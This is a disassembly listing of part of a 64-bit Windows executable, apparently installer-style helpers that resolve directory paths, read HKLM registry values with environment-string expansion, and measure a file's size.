   140002c23:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002c28:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140002c2e:	48 ff 15 3b 89 00 00 	rex.W call *0x893b(%rip)        # 0x14000b570
   140002c35:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002c3a:	8a 07                	mov    (%rdi),%al
   140002c3c:	84 c0                	test   %al,%al
   140002c3e:	0f 84 f1 01 00 00    	je     0x140002e35
   140002c44:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   140002c48:	8a c8                	mov    %al,%cl
   140002c4a:	48 ff 15 df 86 00 00 	rex.W call *0x86df(%rip)        # 0x14000b330
   140002c51:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002c56:	8a 17                	mov    (%rdi),%dl
   140002c58:	88 13                	mov    %dl,(%rbx)
   140002c5a:	85 c0                	test   %eax,%eax
   140002c5c:	74 06                	je     0x140002c64
   140002c5e:	8a 47 01             	mov    0x1(%rdi),%al
   140002c61:	88 43 01             	mov    %al,0x1(%rbx)
   140002c64:	80 3f 23             	cmpb   $0x23,(%rdi)
   140002c67:	0f 85 9a 01 00 00    	jne    0x140002e07
   140002c6d:	48 8b cf             	mov    %rdi,%rcx
   140002c70:	48 ff 15 89 89 00 00 	rex.W call *0x8989(%rip)        # 0x14000b600
   140002c77:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002c7c:	48 8b f8             	mov    %rax,%rdi
   140002c7f:	48 0f be 08          	movsbq (%rax),%rcx
   140002c83:	48 ff 15 3e 89 00 00 	rex.W call *0x893e(%rip)        # 0x14000b5c8
   140002c8a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002c8f:	3c 44                	cmp    $0x44,%al
   140002c91:	0f 85 ca 00 00 00    	jne    0x140002d61
   140002c97:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002c9c:	e8 d3 69 00 00       	call   0x140009674
   140002ca1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002ca6:	49 8b c6             	mov    %r14,%rax
   140002ca9:	48 ff c0             	inc    %rax
   140002cac:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   140002cb0:	75 f7                	jne    0x140002ca9
   140002cb2:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002cb7:	48 03 d0             	add    %rax,%rdx
   140002cba:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002cbf:	48 ff 15 2a 89 00 00 	rex.W call *0x892a(%rip)        # 0x14000b5f0
   140002cc6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002ccb:	48 85 c0             	test   %rax,%rax
   140002cce:	74 08                	je     0x140002cd8
   140002cd0:	80 38 5c             	cmpb   $0x5c,(%rax)
   140002cd3:	75 03                	jne    0x140002cd8
   140002cd5:	c6 00 00             	movb   $0x0,(%rax)
   140002cd8:	48 3b de             	cmp    %rsi,%rbx
   140002cdb:	72 69                	jb     0x140002d46
   140002cdd:	48 8b c3             	mov    %rbx,%rax
   140002ce0:	48 2b c6             	sub    %rsi,%rax
   140002ce3:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   140002ce9:	77 5b                	ja     0x140002d46
   140002ceb:	48 8b ce             	mov    %rsi,%rcx
   140002cee:	48 2b cb             	sub    %rbx,%rcx
   140002cf1:	48 81 c1 00 04 00 00 	add    $0x400,%rcx
   140002cf8:	48 8b c1             	mov    %rcx,%rax
   140002cfb:	74 4b                	je     0x140002d48
   140002cfd:	48 81 f9 ff ff ff 7f 	cmp    $0x7fffffff,%rcx
   140002d04:	77 42                	ja     0x140002d48
   140002d06:	41 b8 fe ff ff 7f    	mov    $0x7ffffffe,%r8d
   140002d0c:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140002d11:	4c 2b c1             	sub    %rcx,%r8
   140002d14:	48 8b d3             	mov    %rbx,%rdx
   140002d17:	4c 2b cb             	sub    %rbx,%r9
   140002d1a:	49 8d 04 08          	lea    (%r8,%rcx,1),%rax
   140002d1e:	48 85 c0             	test   %rax,%rax
   140002d21:	74 13                	je     0x140002d36
   140002d23:	41 8a 04 11          	mov    (%r9,%rdx,1),%al
   140002d27:	84 c0                	test   %al,%al
   140002d29:	74 0b                	je     0x140002d36
   140002d2b:	88 02                	mov    %al,(%rdx)
   140002d2d:	48 ff c2             	inc    %rdx
   140002d30:	48 83 e9 01          	sub    $0x1,%rcx
   140002d34:	75 e4                	jne    0x140002d1a
   140002d36:	48 85 c9             	test   %rcx,%rcx
   140002d39:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140002d3d:	48 0f 45 c2          	cmovne %rdx,%rax
   140002d41:	c6 00 00             	movb   $0x0,(%rax)
   140002d44:	eb 0a                	jmp    0x140002d50
   140002d46:	33 c0                	xor    %eax,%eax
   140002d48:	48 85 c0             	test   %rax,%rax
   140002d4b:	74 03                	je     0x140002d50
   140002d4d:	c6 03 00             	movb   $0x0,(%rbx)
   140002d50:	49 8b c6             	mov    %r14,%rax
   140002d53:	48 ff c0             	inc    %rax
   140002d56:	80 3c 03 00          	cmpb   $0x0,(%rbx,%rax,1)
   140002d5a:	75 f7                	jne    0x140002d53
   140002d5c:	e9 9c 00 00 00       	jmp    0x140002dfd
   140002d61:	48 0f be 0f          	movsbq (%rdi),%rcx
   140002d65:	48 ff 15 5c 88 00 00 	rex.W call *0x885c(%rip)        # 0x14000b5c8
   140002d6c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002d71:	3c 45                	cmp    $0x45,%al
   140002d73:	0f 85 89 00 00 00    	jne    0x140002e02
   140002d79:	48 3b de             	cmp    %rsi,%rbx
   140002d7c:	72 69                	jb     0x140002de7
   140002d7e:	48 8b c3             	mov    %rbx,%rax
   140002d81:	48 2b c6             	sub    %rsi,%rax
   140002d84:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   140002d8a:	77 5b                	ja     0x140002de7
   140002d8c:	48 8b ce             	mov    %rsi,%rcx
   140002d8f:	48 2b cb             	sub    %rbx,%rcx
   140002d92:	48 81 c1 00 04 00 00 	add    $0x400,%rcx
   140002d99:	48 8b c1             	mov    %rcx,%rax
   140002d9c:	74 4b                	je     0x140002de9
   140002d9e:	48 81 f9 ff ff ff 7f 	cmp    $0x7fffffff,%rcx
   140002da5:	77 42                	ja     0x140002de9
   140002da7:	41 b8 fe ff ff 7f    	mov    $0x7ffffffe,%r8d
   140002dad:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140002db2:	4c 2b c1             	sub    %rcx,%r8
   140002db5:	48 8b d3             	mov    %rbx,%rdx
   140002db8:	4c 2b cb             	sub    %rbx,%r9
   140002dbb:	49 8d 04 08          	lea    (%r8,%rcx,1),%rax
   140002dbf:	48 85 c0             	test   %rax,%rax
   140002dc2:	74 13                	je     0x140002dd7
   140002dc4:	41 8a 04 11          	mov    (%r9,%rdx,1),%al
   140002dc8:	84 c0                	test   %al,%al
   140002dca:	74 0b                	je     0x140002dd7
   140002dcc:	88 02                	mov    %al,(%rdx)
   140002dce:	48 ff c2             	inc    %rdx
   140002dd1:	48 83 e9 01          	sub    $0x1,%rcx
   140002dd5:	75 e4                	jne    0x140002dbb
   140002dd7:	48 85 c9             	test   %rcx,%rcx
   140002dda:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140002dde:	48 0f 45 c2          	cmovne %rdx,%rax
   140002de2:	c6 00 00             	movb   $0x0,(%rax)
   140002de5:	eb 0a                	jmp    0x140002df1
   140002de7:	33 c0                	xor    %eax,%eax
   140002de9:	48 85 c0             	test   %rax,%rax
   140002dec:	74 03                	je     0x140002df1
   140002dee:	c6 03 00             	movb   $0x0,(%rbx)
   140002df1:	49 8b c6             	mov    %r14,%rax
   140002df4:	48 ff c0             	inc    %rax
   140002df7:	80 3c 03 00          	cmpb   $0x0,(%rbx,%rax,1)
   140002dfb:	75 f7                	jne    0x140002df4
   140002dfd:	48 03 d8             	add    %rax,%rbx
   140002e00:	eb 17                	jmp    0x140002e19
   140002e02:	80 3f 23             	cmpb   $0x23,(%rdi)
   140002e05:	75 12                	jne    0x140002e19
   140002e07:	48 8b cb             	mov    %rbx,%rcx
   140002e0a:	48 ff 15 ef 87 00 00 	rex.W call *0x87ef(%rip)        # 0x14000b600
   140002e11:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002e16:	48 8b d8             	mov    %rax,%rbx
   140002e19:	48 8b cf             	mov    %rdi,%rcx
   140002e1c:	48 ff 15 dd 87 00 00 	rex.W call *0x87dd(%rip)        # 0x14000b600
   140002e23:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002e28:	48 8b f8             	mov    %rax,%rdi
   140002e2b:	8a 00                	mov    (%rax),%al
   140002e2d:	84 c0                	test   %al,%al
   140002e2f:	0f 85 13 fe ff ff    	jne    0x140002c48
   140002e35:	c6 03 00             	movb   $0x0,(%rbx)
   140002e38:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   140002e3f:	00 
   140002e40:	48 33 cc             	xor    %rsp,%rcx
   140002e43:	e8 68 6d 00 00       	call   0x140009bb0
   140002e48:	48 8b 9c 24 70 01 00 	mov    0x170(%rsp),%rbx
   140002e4f:	00 
   140002e50:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   140002e57:	41 5e                	pop    %r14
   140002e59:	5f                   	pop    %rdi
   140002e5a:	5e                   	pop    %rsi
   140002e5b:	c3                   	ret
   140002e5c:	cc                   	int3
   140002e5d:	cc                   	int3
   140002e5e:	cc                   	int3
   140002e5f:	cc                   	int3
   140002e60:	cc                   	int3
   140002e61:	cc                   	int3
   140002e62:	cc                   	int3
   140002e63:	cc                   	int3
   140002e64:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002e69:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002e6e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002e73:	57                   	push   %rdi
   140002e74:	48 83 ec 20          	sub    $0x20,%rsp
   140002e78:	48 8b 19             	mov    (%rcx),%rbx
   140002e7b:	48 8b f2             	mov    %rdx,%rsi
   140002e7e:	48 8b f9             	mov    %rcx,%rdi
   140002e81:	33 ed                	xor    %ebp,%ebp
   140002e83:	eb 08                	jmp    0x140002e8d
   140002e85:	40 38 2b             	cmp    %bpl,(%rbx)
   140002e88:	74 6a                	je     0x140002ef4
   140002e8a:	48 ff c3             	inc    %rbx
   140002e8d:	0f be 13             	movsbl (%rbx),%edx
   140002e90:	48 8b ce             	mov    %rsi,%rcx
   140002e93:	e8 84 68 00 00       	call   0x14000971c
   140002e98:	48 85 c0             	test   %rax,%rax
   140002e9b:	75 e8                	jne    0x140002e85
   140002e9d:	0f be 13             	movsbl (%rbx),%edx
   140002ea0:	48 8b ce             	mov    %rsi,%rcx
   140002ea3:	48 89 1f             	mov    %rbx,(%rdi)
   140002ea6:	e8 71 68 00 00       	call   0x14000971c
   140002eab:	48 85 c0             	test   %rax,%rax
   140002eae:	75 1d                	jne    0x140002ecd
   140002eb0:	48 8b fb             	mov    %rbx,%rdi
   140002eb3:	80 3f 00             	cmpb   $0x0,(%rdi)
   140002eb6:	74 15                	je     0x140002ecd
   140002eb8:	48 ff c7             	inc    %rdi
   140002ebb:	48 8b ce             	mov    %rsi,%rcx
   140002ebe:	ff c5                	inc    %ebp
   140002ec0:	0f be 17             	movsbl (%rdi),%edx
   140002ec3:	e8 54 68 00 00       	call   0x14000971c
   140002ec8:	48 85 c0             	test   %rax,%rax
   140002ecb:	74 e6                	je     0x140002eb3
   140002ecd:	48 63 c5             	movslq %ebp,%rax
   140002ed0:	48 03 c3             	add    %rbx,%rax
   140002ed3:	80 38 00             	cmpb   $0x0,(%rax)
   140002ed6:	74 06                	je     0x140002ede
   140002ed8:	c6 00 00             	movb   $0x0,(%rax)
   140002edb:	48 ff c0             	inc    %rax
   140002ede:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002ee3:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140002ee8:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002eed:	48 83 c4 20          	add    $0x20,%rsp
   140002ef1:	5f                   	pop    %rdi
   140002ef2:	c3                   	ret
   140002ef3:	cc                   	int3
   140002ef4:	33 c0                	xor    %eax,%eax
   140002ef6:	eb e6                	jmp    0x140002ede
   140002ef8:	cc                   	int3
   140002ef9:	cc                   	int3
   140002efa:	cc                   	int3
   140002efb:	cc                   	int3
   140002efc:	cc                   	int3
   140002efd:	cc                   	int3
   140002efe:	cc                   	int3
   140002eff:	cc                   	int3
   140002f00:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002f05:	55                   	push   %rbp
   140002f06:	56                   	push   %rsi
   140002f07:	57                   	push   %rdi
   140002f08:	41 54                	push   %r12
   140002f0a:	41 56                	push   %r14
   140002f0c:	48 8d 6c 24 a0       	lea    -0x60(%rsp),%rbp
   140002f11:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   140002f18:	48 8b 05 61 b1 00 00 	mov    0xb161(%rip),%rax        # 0x14000e080
   140002f1f:	48 33 c4             	xor    %rsp,%rax
   140002f22:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140002f26:	33 ff                	xor    %edi,%edi
   140002f28:	49 8b f0             	mov    %r8,%rsi
   140002f2b:	40 88 39             	mov    %dil,(%rcx)
   140002f2e:	48 8b d9             	mov    %rcx,%rbx
   140002f31:	41 80 38 23          	cmpb   $0x23,(%r8)
   140002f35:	44 8d 67 01          	lea    0x1(%rdi),%r12d
   140002f39:	0f 85 d3 01 00 00    	jne    0x140003112
   140002f3f:	49 03 f4             	add    %r12,%rsi
   140002f42:	48 0f be 0e          	movsbq (%rsi),%rcx
   140002f46:	48 ff 15 7b 86 00 00 	rex.W call *0x867b(%rip)        # 0x14000b5c8
   140002f4d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002f52:	48 8b ce             	mov    %rsi,%rcx
   140002f55:	4c 8b f0             	mov    %rax,%r14
   140002f58:	48 ff 15 a1 86 00 00 	rex.W call *0x86a1(%rip)        # 0x14000b600
   140002f5f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002f64:	48 8b c8             	mov    %rax,%rcx
   140002f67:	48 ff 15 92 86 00 00 	rex.W call *0x8692(%rip)        # 0x14000b600
   140002f6e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002f73:	48 8b f0             	mov    %rax,%rsi
   140002f76:	41 80 fe 41          	cmp    $0x41,%r14b
   140002f7a:	74 3e                	je     0x140002fba
   140002f7c:	41 80 fe 53          	cmp    $0x53,%r14b
   140002f80:	74 1f                	je     0x140002fa1
   140002f82:	41 80 fe 57          	cmp    $0x57,%r14b
   140002f86:	75 32                	jne    0x140002fba
   140002f88:	ba 04 01 00 00       	mov    $0x104,%edx
   140002f8d:	48 8b cb             	mov    %rbx,%rcx
   140002f90:	48 ff 15 a1 83 00 00 	rex.W call *0x83a1(%rip)        # 0x14000b338
   140002f97:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002f9c:	e9 6b 01 00 00       	jmp    0x14000310c
   140002fa1:	ba 04 01 00 00       	mov    $0x104,%edx
   140002fa6:	48 8b cb             	mov    %rbx,%rcx
   140002fa9:	48 ff 15 48 83 00 00 	rex.W call *0x8348(%rip)        # 0x14000b2f8
   140002fb0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002fb5:	e9 52 01 00 00       	jmp    0x14000310c
   140002fba:	48 21 7c 24 38       	and    %rdi,0x38(%rsp)
   140002fbf:	4c 8d 05 52 89 00 00 	lea    0x8952(%rip),%r8        # 0x14000b918
   140002fc6:	21 7c 24 30          	and    %edi,0x30(%rsp)
   140002fca:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140002fcf:	4c 2b c0             	sub    %rax,%r8
   140002fd2:	c7 44 24 34 04 01 00 	movl   $0x104,0x34(%rsp)
   140002fd9:	00 
   140002fda:	ba 04 01 00 00       	mov    $0x104,%edx
   140002fdf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002fe4:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140002feb:	48 85 c0             	test   %rax,%rax
   140002fee:	74 12                	je     0x140003002
   140002ff0:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   140002ff4:	84 c0                	test   %al,%al
   140002ff6:	74 0a                	je     0x140003002
   140002ff8:	88 01                	mov    %al,(%rcx)
   140002ffa:	49 03 cc             	add    %r12,%rcx
   140002ffd:	49 2b d4             	sub    %r12,%rdx
   140003000:	75 e2                	jne    0x140002fe4
   140003002:	48 85 d2             	test   %rdx,%rdx
   140003005:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140003009:	4c 8b c6             	mov    %rsi,%r8
   14000300c:	ba 04 01 00 00       	mov    $0x104,%edx
   140003011:	48 0f 45 c1          	cmovne %rcx,%rax
   140003015:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000301a:	40 88 38             	mov    %dil,(%rax)
   14000301d:	e8 ba 65 00 00       	call   0x1400095dc
   140003022:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140003027:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   14000302d:	45 33 c0             	xor    %r8d,%r8d
   140003030:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003035:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000303a:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140003041:	48 ff 15 c0 81 00 00 	rex.W call *0x81c0(%rip)        # 0x14000b208
   140003048:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000304d:	85 c0                	test   %eax,%eax
   14000304f:	0f 85 b7 00 00 00    	jne    0x14000310c
   140003055:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000305a:	48 8d 44 24 34       	lea    0x34(%rsp),%rax
   14000305f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003064:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140003069:	45 33 c0             	xor    %r8d,%r8d
   14000306c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003071:	48 8d 15 b8 87 00 00 	lea    0x87b8(%rip),%rdx        # 0x14000b830
   140003078:	48 ff 15 c9 81 00 00 	rex.W call *0x81c9(%rip)        # 0x14000b248
   14000307f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003084:	85 c0                	test   %eax,%eax
   140003086:	75 73                	jne    0x1400030fb
   140003088:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000308c:	83 f8 02             	cmp    $0x2,%eax
   14000308f:	75 63                	jne    0x1400030f4
   140003091:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140003097:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000309c:	48 8b cb             	mov    %rbx,%rcx
   14000309f:	48 ff 15 62 83 00 00 	rex.W call *0x8362(%rip)        # 0x14000b408
   1400030a6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400030ab:	85 c0                	test   %eax,%eax
   1400030ad:	74 41                	je     0x1400030f0
   1400030af:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400030b4:	ba 04 01 00 00       	mov    $0x104,%edx
   1400030b9:	4c 2b c3             	sub    %rbx,%r8
   1400030bc:	48 8b cb             	mov    %rbx,%rcx
   1400030bf:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400030c6:	48 85 c0             	test   %rax,%rax
   1400030c9:	74 12                	je     0x1400030dd
   1400030cb:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   1400030cf:	84 c0                	test   %al,%al
   1400030d1:	74 0a                	je     0x1400030dd
   1400030d3:	88 01                	mov    %al,(%rcx)
   1400030d5:	49 03 cc             	add    %r12,%rcx
   1400030d8:	49 2b d4             	sub    %r12,%rdx
   1400030db:	75 e2                	jne    0x1400030bf
   1400030dd:	48 85 d2             	test   %rdx,%rdx
   1400030e0:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400030e4:	48 0f 45 c1          	cmovne %rcx,%rax
   1400030e8:	40 88 38             	mov    %dil,(%rax)
   1400030eb:	41 8b fc             	mov    %r12d,%edi
   1400030ee:	eb 0b                	jmp    0x1400030fb
   1400030f0:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1400030f4:	41 3b c4             	cmp    %r12d,%eax
   1400030f7:	41 0f 44 fc          	cmove  %r12d,%edi
   1400030fb:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003100:	48 ff 15 51 81 00 00 	rex.W call *0x8151(%rip)        # 0x14000b258
   140003107:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000310c:	85 ff                	test   %edi,%edi
   14000310e:	75 23                	jne    0x140003133
   140003110:	eb 11                	jmp    0x140003123
   140003112:	ba 04 01 00 00       	mov    $0x104,%edx
   140003117:	48 ff 15 da 81 00 00 	rex.W call *0x81da(%rip)        # 0x14000b2f8
   14000311e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003123:	4c 8b c6             	mov    %rsi,%r8
   140003126:	ba 04 01 00 00       	mov    $0x104,%edx
   14000312b:	48 8b cb             	mov    %rbx,%rcx
   14000312e:	e8 a9 64 00 00       	call   0x1400095dc
   140003133:	41 8b c4             	mov    %r12d,%eax
   140003136:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   14000313a:	48 33 cc             	xor    %rsp,%rcx
   14000313d:	e8 6e 6a 00 00       	call   0x140009bb0
   140003142:	48 8b 9c 24 98 01 00 	mov    0x198(%rsp),%rbx
   140003149:	00 
   14000314a:	48 81 c4 60 01 00 00 	add    $0x160,%rsp
   140003151:	41 5e                	pop    %r14
   140003153:	41 5c                	pop    %r12
   140003155:	5f                   	pop    %rdi
   140003156:	5e                   	pop    %rsi
   140003157:	5d                   	pop    %rbp
   140003158:	c3                   	ret
   140003159:	cc                   	int3
   14000315a:	cc                   	int3
   14000315b:	cc                   	int3
   14000315c:	cc                   	int3
   14000315d:	cc                   	int3
   14000315e:	cc                   	int3
   14000315f:	cc                   	int3
   140003160:	48 8b c4             	mov    %rsp,%rax
   140003163:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140003167:	48 83 ec 68          	sub    $0x68,%rsp
   14000316b:	48 83 60 10 00       	andq   $0x0,0x10(%rax)
   140003170:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   140003176:	83 60 08 00          	andl   $0x0,0x8(%rax)
   14000317a:	48 8d 40 10          	lea    0x10(%rax),%rax
   14000317e:	45 33 c0             	xor    %r8d,%r8d
   140003181:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003186:	48 8d 15 83 b0 00 00 	lea    0xb083(%rip),%rdx        # 0x14000e210
   14000318d:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140003194:	48 ff 15 6d 80 00 00 	rex.W call *0x806d(%rip)        # 0x14000b208
   14000319b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400031a0:	85 c0                	test   %eax,%eax
   1400031a2:	75 67                	jne    0x14000320b
   1400031a4:	48 83 64 24 58 00    	andq   $0x0,0x58(%rsp)
   1400031aa:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   1400031af:	48 83 64 24 50 00    	andq   $0x0,0x50(%rsp)
   1400031b5:	45 33 c9             	xor    %r9d,%r9d
   1400031b8:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   1400031be:	45 33 c0             	xor    %r8d,%r8d
   1400031c1:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   1400031c7:	33 d2                	xor    %edx,%edx
   1400031c9:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400031ce:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400031d3:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400031d9:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   1400031df:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400031e5:	48 ff 15 24 80 00 00 	rex.W call *0x8024(%rip)        # 0x14000b210
   1400031ec:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400031f1:	85 c0                	test   %eax,%eax
   1400031f3:	74 05                	je     0x1400031fa
   1400031f5:	83 64 24 70 00       	andl   $0x0,0x70(%rsp)
   1400031fa:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400031ff:	48 ff 15 52 80 00 00 	rex.W call *0x8052(%rip)        # 0x14000b258
   140003206:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000320b:	8b 44 24 70          	mov    0x70(%rsp),%eax
   14000320f:	48 83 c4 68          	add    $0x68,%rsp
   140003213:	c3                   	ret
   140003214:	cc                   	int3
   140003215:	cc                   	int3
   140003216:	cc                   	int3
   140003217:	cc                   	int3
   140003218:	cc                   	int3
   140003219:	cc                   	int3
   14000321a:	cc                   	int3
   14000321b:	cc                   	int3
   14000321c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003221:	57                   	push   %rdi
   140003222:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140003229:	48 8b 05 50 ae 00 00 	mov    0xae50(%rip),%rax        # 0x14000e080
   140003230:	48 33 c4             	xor    %rsp,%rax
   140003233:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   14000323a:	00 
   14000323b:	bf 04 01 00 00       	mov    $0x104,%edi
   140003240:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003245:	8b d7                	mov    %edi,%edx
   140003247:	33 db                	xor    %ebx,%ebx
   140003249:	48 ff 15 e8 80 00 00 	rex.W call *0x80e8(%rip)        # 0x14000b338
   140003250:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003255:	85 c0                	test   %eax,%eax
   140003257:	74 6a                	je     0x1400032c3
   140003259:	4c 8d 05 a8 86 00 00 	lea    0x86a8(%rip),%r8        # 0x14000b908
   140003260:	8b d7                	mov    %edi,%edx
   140003262:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003267:	e8 70 63 00 00       	call   0x1400095dc
   14000326c:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140003271:	45 33 c0             	xor    %r8d,%r8d
   140003274:	33 d2                	xor    %edx,%edx
   140003276:	33 c9                	xor    %ecx,%ecx
   140003278:	48 ff 15 a9 80 00 00 	rex.W call *0x80a9(%rip)        # 0x14000b328
   14000327f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003284:	8d 53 40             	lea    0x40(%rbx),%edx
   140003287:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000328c:	48 ff 15 3d 80 00 00 	rex.W call *0x803d(%rip)        # 0x14000b2d0
   140003293:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003298:	8b f8                	mov    %eax,%edi
   14000329a:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000329d:	74 24                	je     0x1400032c3
   14000329f:	33 d2                	xor    %edx,%edx
   1400032a1:	44 8d 43 02          	lea    0x2(%rbx),%r8d
   1400032a5:	8b c8                	mov    %eax,%ecx
   1400032a7:	48 ff 15 2a 80 00 00 	rex.W call *0x802a(%rip)        # 0x14000b2d8
   1400032ae:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400032b3:	8b cf                	mov    %edi,%ecx
   1400032b5:	8b d8                	mov    %eax,%ebx
   1400032b7:	48 ff 15 b2 80 00 00 	rex.W call *0x80b2(%rip)        # 0x14000b370
   1400032be:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400032c3:	8b c3                	mov    %ebx,%eax
   1400032c5:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   1400032cc:	00 
   1400032cd:	48 33 cc             	xor    %rsp,%rcx
   1400032d0:	e8 db 68 00 00       	call   0x140009bb0
   1400032d5:	48 8b 9c 24 50 01 00 	mov    0x150(%rsp),%rbx
   1400032dc:	00 
   1400032dd:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   1400032e4:	5f                   	pop    %rdi
   1400032e5:	c3                   	ret
   1400032e6:	cc                   	int3
   1400032e7:	cc                   	int3
   1400032e8:	cc                   	int3
   1400032e9:	cc                   	int3
   1400032ea:	cc                   	int3
   1400032eb:	cc                   	int3
   1400032ec:	cc                   	int3
   1400032ed:	cc                   	int3
   1400032ee:	cc                   	int3
   1400032ef:	cc                   	int3
   1400032f0:	48 8b c4             	mov    %rsp,%rax
   1400032f3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400032f7:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400032fb:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400032ff:	55                   	push   %rbp
   140003300:	48 8d 68 a1          	lea    -0x5f(%rax),%rbp
   140003304:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000330b:	48 8b 05 6e ad 00 00 	mov    0xad6e(%rip),%rax        # 0x14000e080
   140003312:	48 33 c4             	xor    %rsp,%rax
   140003315:	48 89 45 47          	mov    %rax,0x47(%rbp)
   140003319:	8b 05 dd ae 00 00    	mov    0xaedd(%rip),%eax        # 0x14000e1fc
   14000331f:	33 f6                	xor    %esi,%esi
   140003321:	48 89 75 2f          	mov    %rsi,0x2f(%rbp)
   140003325:	89 75 27             	mov    %esi,0x27(%rbp)
